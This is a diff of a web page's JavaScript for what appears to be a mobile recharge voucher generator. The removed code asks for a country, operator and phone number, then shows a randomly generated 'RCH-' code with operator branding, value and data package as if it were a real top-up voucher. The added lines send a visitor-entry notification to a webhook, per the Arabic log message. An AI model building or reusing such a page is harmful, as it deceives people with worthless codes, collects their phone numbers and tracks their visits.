-                code: code,
-                icon: opData.icon,
-                cssClass: opData.cssClass,
-                prefix: opData.prefix,
-                color: opData.color,
-                phone: phoneNumber
-            };
-
-            currentVoucher = voucher;
-            renderVoucher(voucher);
-            showStep('step-voucher');
-            updateStepIndicator(5);
-
-            hideStatus(els.statusPhone);
-            showStatus(els.statusVoucher, 'success', t.generated);
-        }
-
-        function generateVoucherCode() {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-            const parts = [];
-            for (let i = 0; i < 4; i++) {
-                let part = '';
-                for (let j = 0; j < 4; j++) {
-                    part += chars.charAt(Math.floor(Math.random() * chars.length));
-                }
-                parts.push(part);
-            }
-            return `RCH-${parts[0]}-${parts[1]}-${parts[2]}`;
-        }
-
-        // ================================================================
-        //  RENDER VOUCHER
-        // ================================================================
-        function renderVoucher(voucher) {
-            const t = LANG[currentLang];
-
-            // Icon
-            els.voucherIcon.className = `voucher-icon ${voucher.cssClass}`;
-            els.voucherIcon.innerHTML = `<i class="fas ${voucher.icon}"></i>`;
-
-            // Operator & country
-            els.voucherOperator.textContent = voucher.operatorName;
-            els.voucherCountry.textContent = voucher.country;
-
-            // Value
-            els.vvValue.innerHTML =
-                `${voucher.value} <span style="font-size:14px; -webkit-text-fill-color:#998;">${voucher.currency}</span>`;
-
-            // Data package
-            els.vvData.textContent = voucher.dataPackage;
-
-            // Code
-            els.voucherCode.textContent = voucher.code;
-        }
-
-        // ================================================================
-        //  COPY CODE
-        // ================================================================
-        function copyCode() {
-            const code = els.voucherCode.textContent;
-            const t = LANG[currentLang];
-            navigator.clipboard.writeText(code).then(() => {
-                const orig = els.copyText.textContent;
-                els.copyText.textContent = t.copied;
-                setTimeout(() => {
-                    els.copyText.textContent = orig;
-                }, 2000);
-            }).catch(() => {
-                // fallback
-                const area = document.createElement('textarea');
-                area.value = code;
-                document.body.appendChild(area);
-                area.select();
-                document.execCommand('copy');
-                document.body.removeChild(area);
-                const orig = els.copyText.textContent;
-                els.copyText.textContent = t.copied;
-                setTimeout(() => {
-                    els.copyText.textContent = orig;
-                }, 2000);
-            });
-        }
-
-        // ================================================================
-        //  NEW VOUCHER / CHANGE OPERATOR
-        // ================================================================
-        function newVoucher() {
-            if (!selectedCountry || !selectedOperator) return;
-            const t = LANG[currentLang];
-            // Clear status
-            hideStatus(els.statusVoucher);
-            // Go back to phone step
-            showStep('step-phone');
-            updateStepIndicator(4);
-            els.phoneInput.value = '';
-            els.phoneInput.focus();
-            updatePhoneHint();
-            // Reset voucher
-            currentVoucher = null;
-        }
-
-        function changeOperator() {
-            if (!selectedCountry) return;
-            const t = LANG[currentLang];
-            hideStatus(els.statusVoucher);
-            showStep('step-operator');
-            updateStepIndicator(3);
-            currentVoucher = null;
-        }
-
-        // ================================================================
-        //  EVENT BINDINGS
-        // ================================================================
-        function bindEvents() {
-            // Language
-            els.langBtns.forEach(btn => {
-                btn.addEventListener('click', () => {
-                    setLanguage(btn.dataset.lang);
-                });
-            });
-
-            els.langContinueBtn.addEventListener('click', () => {
-                if (!currentLang) {
-                    showStatus(els.statusLang, 'error', '⚠️ يرجى اختيار اللغة');
-                    return;
-                }
-                hideStatus(els.statusLang);
-                renderCountries();
-                showStep('step-country');
-                updateStepIndicator(2);
-            });
-
-            // Phone input
-            els.phoneInput.addEventListener('input', updatePhoneHint);
-
-            // Generate
-            els.generateBtn.addEventListener('click', generateVoucher);
-
-            // Enter key on phone input
-            els.phoneInput.addEventListener('keydown', (e) => {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    generateVoucher();
-                }
-            });
-
-            // Copy
-            els.copyCodeBtn.addEventListener('click', copyCode);
-
-            // New voucher
-            els.newVoucherBtn.addEventListener('click', newVoucher);
-
-            // Change operator
-            els.changeOpBtn.addEventListener('click', changeOperator);
-        }
-
-        // ================================================================
-        //  INIT
-        // ================================================================
-        window.addEventListener('DOMContentLoaded', () => {
-            cacheEls();
-            // Set default language
-            setLanguage('ar');
-            renderCountries();
-            bindEvents();
-            // Show first step
-            showStep('step-lang');
-            updateStepIndicator(1);
+            await notifyUserEntered();
+            detectSuspiciousActivity();
+            console.log('🛡️ الحماية مفعلة وإشعار الدخول تم إرساله إلى Webhook');
         });
     </script>
 </body>
